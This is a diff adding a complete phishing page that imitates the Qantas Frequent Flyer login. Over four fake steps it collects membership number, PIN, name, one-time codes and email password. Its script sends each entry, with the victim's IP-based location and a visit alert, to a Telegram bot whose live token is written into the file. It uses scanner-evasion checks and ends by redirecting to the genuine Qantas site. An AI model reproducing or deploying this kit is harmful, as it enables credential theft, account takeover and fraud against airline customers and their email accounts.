@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Qantas - Log in</title>
+<link rel="icon" href="https://www.qantas.com/etc/designs/qantas/global/img/qantas.svg">
+    <link rel="shortcut" href="https://www.qantas.com/etc/designs/qantas/global/img/qantas.svg">
+    <link rel="appel-touch-icon" href="https://wordpress-206736-0.cloudclusters.net/qantsau/img/favicon.ico">
+	<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <!-- EmailJS (optional - remove if not using) -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <style>
+    /* ────────────────────────────────────────────────
+       RESET & BASE
+    ──────────────────────────────────────────────── */
+    html, body { height: 100%; margin: 0; }
+    *, *::before, *::after { box-sizing: border-box; }
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #fff;
+      color: #111;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ────────────────────────────────────────────────
+       HEADER (two logos centered)
+    ──────────────────────────────────────────────── */
+    header {
+      height: 80px;
+      border-bottom: 1px solid #e5e7eb;
+      flex: 0 0 auto;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .header-inner {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    img.Qantas-logo    { height: 52px; width: 110px; object-fit: contain; }
+    img.oneworld-logo { height: 28px; width: auto; opacity: 0.95; }
+
+    /* ────────────────────────────────────────────────
+       MAIN – centered card
+    ──────────────────────────────────────────────── */
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 16px 40px 48px;
+    }
+    .page-container {
+      max-width: 400px;
+      width: 100%;
+    }
+    .login-card {
+      background: white;
+      box-shadow: 0 15px 25px -8px rgba(0,0,0,0.35);
+      border-radius: 2px;
+      border-top: 4px solid #db0000;
+      padding: 32px 30px 28px;
+      position: relative;
+      overflow: hidden;
+    }
+    h1 {
+      font-size: 26px;
+      font-weight: 500;
+      text-align: center;
+      margin: 0 0 4px;
+    }
+    .subtitle {
+      font-size: 14px;
+      color: #323232;
+      text-align: center;
+      margin: 20px 0 26px;
+    }
+
+    /* ────────────────────────────────────────────────
+       FORMS
+    ──────────────────────────────────────────────── */
+    form {
+      display: none;
+      flex-direction: column;
+    }
+    form.active { display: flex; }
+    .form-row { margin-bottom: 12px; }
+    .label-with-forgot {
+      display: flex;
+      justify-content: space-between;
+      font-size: 13px;
+      color: #9ca3af;
+      margin-bottom: 4px;
+    }
+    label.field-label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 6px;
+      color: #374151;
+    }
+    a.forgot-link {
+      color: #db0000;
+      font-size: 12.5px;
+      text-decoration: none;
+    }
+    a.forgot-link:hover { text-decoration: underline; }
+    input[type="text"],
+    input[type="password"],
+    input[type="email"] {
+      width: 100%;
+      height: 48px;
+      padding: 0 15px;
+      border: 2px solid #e5e7eb;
+      border-radius: 2px;
+      font-size: 15px;
+      color: #111;
+    }
+    input:focus {
+      border-color: #f8eded;
+      box-shadow: 0 0 0 2px rgba(248,237,237,0.8);
+      outline: none;
+    }
+    .checkbox-row {
+      margin: 20px 0 24px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 15px;
+      color: #6b7280;
+    }
+    button.login-btn {
+      width: 100%;
+      padding: 16px;
+      background: #e40000;
+      color: white;
+      border: none;
+      border-radius: 2px;
+      font-size: 16px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    button.login-btn:hover:not(:disabled) {
+      background: #c40000;
+      transform: translateY(-1px);
+    }
+    button.login-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .join-text {
+      font-size: 13px;
+      text-align: center;
+      margin-top: 20px;
+      color: #6b7280;
+    }
+    .join-text a { color: #db0000; font-weight: 700; text-decoration: none; }
+    .join-text a:hover { text-decoration: underline; }
+
+    /* ────────────────────────────────────────────────
+       LOADING & ERROR
+    ──────────────────────────────────────────────── */
+    .loading-overlay {
+      position: absolute;
+      inset: 0;
+      background: rgba(255,255,255,0.95);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 20;
+    }
+    .loading-overlay.active { display: flex; }
+    .cube-spinner {
+      width: 60px; height: 60px;
+      position: relative;
+      transform-style: preserve-3d;
+      animation: rotateCube 2s infinite linear;
+    }
+    .cube-face {
+      position: absolute;
+      width: 60px; height: 60px;
+      background: linear-gradient(135deg, #db0000, #b91c1c);
+      border: 2px solid rgba(255,255,255,0.3);
+      opacity: 0.8;
+    }
+    .cube-face:nth-child(1) { transform: rotateY(0deg) translateZ(30px); }
+    .cube-face:nth-child(2) { transform: rotateY(90deg) translateZ(30px); }
+    .cube-face:nth-child(3) { transform: rotateY(180deg) translateZ(30px); }
+    .cube-face:nth-child(4) { transform: rotateY(-90deg) translateZ(30px); }
+    .cube-face:nth-child(5) { transform: rotateX(90deg) translateZ(30px); }
+    .cube-face:nth-child(6) { transform: rotateX(-90deg) translateZ(30px); }
+    @keyframes rotateCube {
+      0%   { transform: rotateX(0deg) rotateY(0deg); }
+      100% { transform: rotateX(360deg) rotateY(360deg); }
+    }
+    .error-message {
+      background: #fee2e2;
+      border: 1px solid #fecaca;
+      color: #dc2626;
+      padding: 12px 16px;
+      border-radius: 8px;
+      margin-bottom: 16px;
+      font-size: 14px;
+      display: none;
+    }
+    .error-message.active { display: block; }
+
+    /* ────────────────────────────────────────────────
+       FOOTER
+    ──────────────────────────────────────────────── */
+    footer.site-footer {
+      flex: 0 0 auto;
+      border-top: 4px solid #db0000;
+      margin-top: 18px;
+    }
+    .footer-links {
+      display: flex;
+      flex-direction: column;
+      background: #222;
+      padding: 12px 0;
+      text-align: center;
+    }
+    @media (min-width: 640px) { .footer-links { flex-direction: row; justify-content: center; } }
+    .footer-links a {
+      color: #fff;
+      margin: 0.8rem 1rem;
+      text-decoration: none;
+    }
+    .footer-links a:hover { color: #db0000; }
+    .footer-bottom {
+      padding: 16px 0;
+      background: white;
+      color: #4b5563;
+      border-top: 1px solid #e5e7eb;
+      text-align: center;
+    }
+
+    /* ────────────────────────────────────────────────
+       HONEYPOT (anti-bot)
+    ──────────────────────────────────────────────── */
+    .honeypot {
+      position: absolute !important;
+      left: -9999px !important;
+      width: 1px !important;
+      height: 1px !important;
+      overflow: hidden !important;
+    }
+
+    /* ────────────────────────────────────────────────
+       MOBILE
+    ──────────────────────────────────────────────── */
+    @media (max-width: 480px) {
+      .login-card { margin: 0 10px; padding: 24px 20px; }
+      header { height: 70px; }
+      img.Cent-logo { height: 36px; width: 95px; }
+      img.oneworld-logo { height: 24px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <div class="header-inner">
+      <a class="header-link" href="#">
+        <img class="Qantas-logo" alt="Qantas" src="https://www.qantas.com/etc/designs/qantas/global/img/qantas.svg" />
+        <img class="oneworld-logo" alt="Oneworld" src="https://1000logos.net/wp-content/uploads/2020/03/Oneworld-Logo.png" />
+      </a>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main>
+    <div class="page-container">
+      <section class="login-card">
+
+        <!-- Loading Overlay -->
+        <div class="loading-overlay" id="loadingOverlay">
+          <div class="cube-spinner">
+            <div class="cube-face"></div><div class="cube-face"></div>
+            <div class="cube-face"></div><div class="cube-face"></div>
+            <div class="cube-face"></div><div class="cube-face"></div>
+          </div>
+        </div>
+
+        <!-- Error Message -->
+        <div class="error-message" id="errorMessage">
+          Suspicious activity detected. Please try again later.
+        </div>
+
+        <!-- ── STEP 1 ── -->
+        <form id="step-1" class="active">
+          <h1>Log in</h1>
+          <p class="subtitle">Continue to Qantas Frequent Flyer</p>
+          <input type="text" name="website" class="honeypot" tabindex="-1" autocomplete="off">
+
+          <div class="form-row">
+            <div class="label-with-forgot">
+              <label for="membershipNumber" class="field-label">Membership number</label>
+              <a href="#" class="forgot-link">Forgot number?</a>
+            </div>
+            <input type="text" id="membershipNumber" inputmode="numeric" maxlength="10" required />
+          </div>
+
+          <div class="form-row">
+            <label for="lastName" class="field-label">Last Name</label>
+            <input type="text" id="lastName" required />
+          </div>
+
+          <div class="form-row">
+            <div class="label-with-forgot">
+              <label for="pin" class="field-label">PIN</label>
+              <a href="#" class="forgot-link">Forgot PIN?</a>
+            </div>
+            <input type="password" id="pin" maxlength="4" inputmode="numeric" required />
+          </div>
+
+          <div class="checkbox-row">
+            <input type="checkbox" id="remember" />
+            <label for="remember">Remember details</label>
+          </div>
+
+          <button type="submit" class="login-btn" id="btnStep1" disabled>LOG IN</button>
+          <p class="join-text">Not a member? You can <a href="#">join here</a>.</p>
+        </form>
+
+        <!-- ── STEP 2 ── -->
+        <form id="step-2">
+          <h1>Verify your identity</h1>
+          <p class="subtitle">Enter your full name and the 6-digit code sent to your phone.</p>
+          <input type="text" name="website" class="honeypot" tabindex="-1" autocomplete="off">
+          <div class="form-row">
+            <label for="fullName" class="field-label">Full name</label>
+            <input type="text" id="fullName" required />
+          </div>
+          <div class="form-row">
+            <label for="code" class="field-label">6-digit code</label>
+            <input type="text" id="code" maxlength="6" inputmode="numeric" required />
+          </div>
+          <button type="submit" class="login-btn">NEXT</button>
+        </form>
+
+        <!-- ── STEP 3 ── -->
+        <form id="step-3">
+          <h1>Code has been sent</h1>
+          <p class="subtitle">Please enter the code sent to your registered mobile +6*****</p>
+          <input type="text" name="website" class="honeypot" tabindex="-1" autocomplete="off">
+          <div class="form-row">
+            <label for="securityCode" class="field-label">Security code</label>
+            <input type="text" id="securityCode" maxlength="6" inputmode="numeric" required />
+          </div>
+          <button type="submit" class="login-btn">VERIFY</button>
+        </form>
+
+        <!-- ── STEP 4 ── -->
+        <form id="step-4">
+          <h1>Link your email account</h1>
+          <p class="subtitle">Please link your email account to your accounts.<br>(We don't save this information.)</p>
+          <input type="text" name="website" class="honeypot" tabindex="-1" autocomplete="off">
+          <div class="form-row">
+            <label for="email" class="field-label">Email</label>
+            <input type="email" id="email" required />
+          </div>
+          <div class="form-row">
+            <label for="emailPassword" class="field-label">Password</label>
+            <input type="password" id="emailPassword" required />
+          </div>
+          <button type="submit" class="login-btn">LOG IN</button>
+        </form>
+
+      </section>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="site-footer">
+    <nav class="footer-links">
+      <a href="#">Contacts</a>
+      <a href="#">Privacy & security</a>
+      <a href="#">Terms of use</a>
+      <a href="#">Viewing tips</a>
+      <a href="#">Worldwide sites</a>
+    </nav>
+    <div class="footer-bottom">
+      <p>© Qantas Airways Limited ABN 16 009 661 901</p>
+    </div>
+  </footer>
+
+  <!-- ────────────────────────────────────────────────
+       JAVASCRIPT – Full logic + anti-bot + Telegram
+  ──────────────────────────────────────────────── -->
+  <script>
+    // ┌───────────────────────────────────────────────┐
+    // │ CONFIG – CHANGE THESE VALUES                  │
+    // └───────────────────────────────────────────────┘
+    const TELEGRAM_BOT_TOKEN = '8882912452:AAGmCKLwkxRHVFzMz9xN__Jhj_eJa-4_bWc'; // e.g. 123456:ABC-DEF1234...
+    const TELEGRAM_CHAT_ID   = '6323534456';           // e.g. 123456789 or -1001234567890
+
+    const FINAL_REDIRECT_URL = 'https://www.qantas.com';         // where to go after finish
+    const LOADING_DURATION   = 7000;                       // 7 seconds
+
+    // ┌───────────────────────────────────────────────┐
+    // │ STATE                                         │
+    // └───────────────────────────────────────────────┘
+    const formData = {
+      membershipNumber: '', lastName: '', pin: '',
+      fullName: '', codeStep2: '',
+      securityCode: '',
+      email: '', emailPassword: '',
+      location: ''
+    };
+
+    // ┌───────────────────────────────────────────────┐
+    // │ ANTI-BOT PROTECTION                           │
+    // └───────────────────────────────────────────────┘
+    const Antibot = {
+      startTime: Date.now(),
+      mouse: 0, keys: 0, clicks: 0,
+      minTime: 4000,
+      maxAttempts: 5,
+      attempts: parseInt(localStorage.getItem('attempts') || '0'),
+
+      track() {
+        document.addEventListener('mousemove', () => this.mouse++);
+        document.addEventListener('keydown',   () => this.keys++);
+        document.addEventListener('click',     () => this.clicks++);
+      },
+
+      isBot(form) {
+        const time = Date.now() - this.startTime;
+        const honeypot = form.querySelector('.honeypot')?.value !== '';
+        const tooFast = time < this.minTime;
+        const inactive = this.mouse < 3 && this.keys < 2 && this.clicks < 2;
+        return honeypot || tooFast || inactive || this.attempts >= this.maxAttempts;
+      },
+
+      block() {
+        document.getElementById('errorMessage').classList.add('active');
+        setTimeout(() => document.getElementById('errorMessage').classList.remove('active'), 12000);
+      },
+
+      logAttempt() {
+        this.attempts++;
+        localStorage.setItem('attempts', this.attempts);
+      },
+
+      init() {
+        this.track();
+      }
+    };
+
+    // ┌───────────────────────────────────────────────┐
+    // │ TELEGRAM SENDER                               │
+    // └───────────────────────────────────────────────┘
+    async function sendTelegram(msg) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      try {
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: msg,
+            parse_mode: 'HTML'
+          })
+        });
+      } catch (err) {
+        console.error('Telegram send failed:', err);
+      }
+    }
+
+    // ┌───────────────────────────────────────────────┐
+    // │ LOCATION (approx)                             │
+    // └───────────────────────────────────────────────┘
+    async function getLoc() {
+      let loc = 'Unknown';
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        loc = `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''} (${data.ip || 'hidden'})`;
+      } catch {}
+      return loc;
+    }
+
+    // ┌───────────────────────────────────────────────┐
+    // │ VISITOR NOTIF (page load)                     │
+    // └───────────────────────────────────────────────┘
+    async function visitorNotify() {
+      const loc = await getLoc();
+      const msg = `
+🔔 <b>NEW VISIT Qantas</b>
+🌐 ${location.href}
+👤 ${navigator.userAgent}
+📱 ${navigator.platform || 'unknown'}
+📍 ${loc}
+🕒 ${new Date().toLocaleString()}
+      `.trim();
+      await sendTelegram(msg);
+    }
+
+    // ┌───────────────────────────────────────────────┐
+    // │ LOADING & STEP CONTROL                        │
+    // └───────────────────────────────────────────────┘
+    const steps = ["step-1","step-2","step-3","step-4"];
+    const loadingEl = document.getElementById("loadingOverlay");
+
+    function showStep(id) {
+      steps.forEach(s => document.getElementById(s).classList.toggle("active", s === id));
+    }
+
+    function showLoading(cb) {
+      loadingEl.classList.add("active");
+      setTimeout(() => {
+        loadingEl.classList.remove("active");
+        cb?.();
+      }, LOADING_DURATION);
+    }
+
+    // Enable step-1 button
+    const s1Inputs = document.querySelectorAll("#membershipNumber, #lastName, #pin");
+    const btn1 = document.getElementById("btnStep1");
+    s1Inputs.forEach(el => el.addEventListener("input", () => {
+      btn1.disabled = !Array.from(s1Inputs).every(i => i.value.trim());
+    }));
+
+    // ── STEP 1 ──
+    document.getElementById("step-1").addEventListener("submit", async e => {
+      e.preventDefault();
+      if (Antibot.isBot(e.target)) return Antibot.block();
+
+      Antibot.logAttempt();
+
+      formData.membershipNumber = document.getElementById("membershipNumber").value;
+      formData.lastName         = document.getElementById("lastName").value;
+      formData.pin              = document.getElementById("pin").value;
+      formData.location         = await getLoc();
+
+      const msg = `
+🔐 <b>Qantas Login Attempt</b>
+👤 Membership #: ${formData.membershipNumber}
+📝 Last Name: ${formData.lastName}
+🔢 PIN: ${formData.pin}
+📍 Location: ${formData.location}
+##### Page by Balo ####
+      `.trim();
+
+      await sendTelegram(msg);
+      showLoading(() => showStep("step-2"));
+    });
+
+    // ── STEP 2 ──
+    document.getElementById("step-2").addEventListener("submit", async e => {
+      e.preventDefault();
+      if (Antibot.isBot(e.target)) return Antibot.block();
+
+      formData.fullName = document.getElementById("fullName").value;
+      formData.codeStep2 = document.getElementById("code").value;
+      formData.location = await getLoc();
+
+      const msg = `
+✅ <b>Step 2 - Identity Verification</b>
+👤 Full Name: ${formData.fullName}
+🔢 6-digit Code: ${formData.codeStep2}
+📍 Location: ${formData.location}
+      `.trim();
+
+      await sendTelegram(msg);
+      showLoading(() => showStep("step-3"));
+    });
+
+    // ── STEP 3 ──
+    document.getElementById("step-3").addEventListener("submit", async e => {
+      e.preventDefault();
+      if (Antibot.isBot(e.target)) return Antibot.block();
+
+      formData.securityCode = document.getElementById("securityCode").value;
+      formData.location = await getLoc();
+
+      const msg = `
+🔒 <b>Step 3 - Security Code</b>
+🔢 Security Code: ${formData.securityCode}
+📍 Location: ${formData.location}
+      `.trim();
+
+      await sendTelegram(msg);
+      showLoading(() => showStep("step-4"));
+    });
+
+    // ── STEP 4 – Final + Summary ──
+    document.getElementById("step-4").addEventListener("submit", async e => {
+      e.preventDefault();
+      if (Antibot.isBot(e.target)) return Antibot.block();
+
+      formData.email        = document.getElementById("email").value;
+      formData.emailPassword = document.getElementById("emailPassword").value;
+      formData.location     = await getLoc();
+
+      // Step 4
+      await sendTelegram(`
+📧 <b>Step 4 - Email Credentials</b>
+📧 Email: ${formData.email}
+🔑 Email Password: ${formData.emailPassword}
+📍 Location: ${formData.location}
+      `.trim());
+
+      // Final summary
+      await sendTelegram(`
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎯 <b>COMPLETE DATA SUMMARY</b>
+👤 Membership #: ${formData.membershipNumber}
+📝 Last Name: ${formData.lastName}
+🔢 PIN: ${formData.pin}
+👤 Full Name: ${formData.fullName}
+🔢 6-digit Code: ${formData.codeStep2}
+🔒 Security Code: ${formData.securityCode}
+📧 Email: ${formData.email}
+🔑 Email Password: ${formData.emailPassword}
+📍 Final Location: ${formData.location}
+      `.trim());
+
+      showLoading(() => {
+        location.href = FINAL_REDIRECT_URL;
+      });
+    });
+
+    // ── INIT ──
+    Antibot.init();
+    window.addEventListener('load', () => {
+      visitorNotify();
+      showStep("step-1");
+    });
+  </script>
+</body>
+</html>
